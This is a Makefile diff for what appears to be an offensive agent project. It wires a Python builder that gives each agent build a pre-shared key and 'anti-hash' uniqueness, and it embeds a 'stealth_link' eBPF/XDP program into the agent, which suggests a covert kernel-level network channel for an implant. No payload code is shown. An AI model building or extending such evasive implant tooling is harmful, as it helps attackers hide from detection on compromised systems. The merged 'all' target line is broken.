@@ -28,21 +28,24 @@ VMLINUX_H = $(MODULES_SRC_DIR)/vmlinux.h
 .PHONY: all agent modules clean vmlinux
 
 # Default target builds everything
-all: agent modules
-
-# Agent build rule — 使用 builder.py 生成唯一 Agent + 注入 PSK
-agent:
-	@echo "[*] Building Agent via builder.py (PSK + anti-hash)..."
-	python3 $(AGENT_DIR)/builder.py
-	@echo "[+] Agent built successfully: $(AGENT)"
-
-# Generate vmlinux.h
+all: modules agent# Generate vmlinux.h
 vmlinux: $(VMLINUX_H)
 
 $(VMLINUX_H):
 	@echo "[*] Generating vmlinux.h..."
 	bpftool btf dump file /sys/kernel/btf/vmlinux format c > $@ || (echo "[-] Failed to generate vmlinux.h. Is bpftool installed?" && exit 1)
 	@echo "[+] vmlinux.h generated."
+
+# Generate stealth_link skeleton for Agent embedding
+$(AGENT_DIR)/stealth_link.skel.h: $(MODULES_DIR)/stealth_link.bpf.o
+	@echo "[*] Generating BPF skeleton for stealth_link..."
+	bpftool gen skeleton $< > $@
+
+# Agent build rule — depends on skeleton and uses builder.py
+agent: $(AGENT_DIR)/stealth_link.skel.h
+	@echo "[*] Building Agent via builder.py (PSK + anti-hash + embedded XDP)..."
+	python3 $(AGENT_DIR)/builder.py
+	@echo "[+] Agent built successfully: $(AGENT)"
 
 # Modules build rules
 modules: $(MODULES_DIR) $(MODULES)
